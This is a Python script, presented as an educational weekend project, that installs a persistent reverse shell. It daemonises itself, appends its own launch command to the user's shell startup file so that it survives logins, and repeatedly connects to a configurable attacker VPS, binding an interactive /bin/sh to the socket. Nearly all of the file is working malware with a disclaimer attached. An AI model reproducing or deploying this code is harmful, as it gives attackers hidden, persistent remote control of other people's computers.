# Note: This tool has been written as a weekend project for strictly educational purposes
# The author does not bear any responsibility for what anyone does with the script or any modification of the same

import sys, os, time, atexit, signal, socket, subprocess

# public IP/Domain name
VPS_URL = ''
# exposed port you'll be running ncat on
VPS_PORT = 0
# .bashrc", ".zshrc", ".profile" or any other shell setup script find in /home/[user]
APPEND_TO = ''

class Daemon:
    def __init__(self, pidfile): self.pidfile = pidfile
    
    def daemonize(self):
        try: 
            pid = os.fork() 
            if pid > 0:
                sys.exit(0) 
        except OSError as err: 
            sys.stderr.write('fork #1 failed: {0}\n'.format(err))
            sys.exit(1)
    
        os.chdir('/') 
        os.setsid() 
        os.umask(0) 
    
        try: 
            pid = os.fork() 
            if pid > 0:
                sys.exit(0) 
        except OSError as err: 
            sys.stderr.write('fork #2 failed: {0}\n'.format(err))
            sys.exit(1) 
    
        sys.stdout.flush()
        sys.stderr.flush()
        si = open(os.devnull, 'r')
        so = open(os.devnull, 'a+')
        se = open(os.devnull, 'a+')

        os.dup2(si.fileno(), sys.stdin.fileno())
        os.dup2(so.fileno(), sys.stdout.fileno())
        os.dup2(se.fileno(), sys.stderr.fileno())
    
        atexit.register(self.delpid)

        pid = str(os.getpid())
        with open(self.pidfile,'w+') as f:
            f.write(pid + '\n')
    
    def delpid(self):
        os.remove(self.pidfile)

    def start(self):
        """Start the daemon."""

        try:
            with open(self.pidfile,'r') as pf:

                pid = int(pf.read().strip())
        except IOError:
            pid = None
    
        if pid:
            message = "pidfile {0} already exist. " + \
                    "Daemon already running?\n"
            sys.stderr.write(message.format(self.pidfile))
            sys.exit(1)
        
        self.daemonize()
        self.run()

    def stop(self):
        """Stop the daemon."""
        try:
            with open(self.pidfile,'r') as pf:
                pid = int(pf.read().strip())
        except IOError:
            pid = None
    
        if not pid:
            message = "pidfile {0} does not exist. " + \
                    "Daemon not running?\n"
            sys.stderr.write(message.format(self.pidfile))
            return

        try:
            while 1:
                os.kill(pid, signal.SIGTERM)
                time.sleep(0.1)
        except OSError as err:
            e = str(err.args)
            if e.find("No such process") > 0:
                if os.path.exists(self.pidfile):
                    os.remove(self.pidfile)
            else:
                print (str(err.args))
                sys.exit(1)

    def restart(self):
        self.stop()
        self.start()

    def run(self):
        pass

class MyDaemon(Daemon):
    def run(self):
        while True:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((VPS_URL,VPS_PORT))
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            subprocess.call(["/bin/sh","-i"])
            time.sleep(10)

def main():
    home = os.path.expanduser("~")
    myname = os.path.basename(sys.argv[0])
    path = home + '/' + APPEND_TO
    with open(path, 'r') as shell_setup_script:
        command = 'python3 ' + os.path.abspath(myname) + '\n'
        if command not in shell_setup_script.read():
            open(path, 'a').write(command)

    pidfile='/tmp/%s' % myname
    daemon = MyDaemon(pidfile)
    daemon.start()
    sys.exit(0)
 
if __name__ == "__main__":
    main()
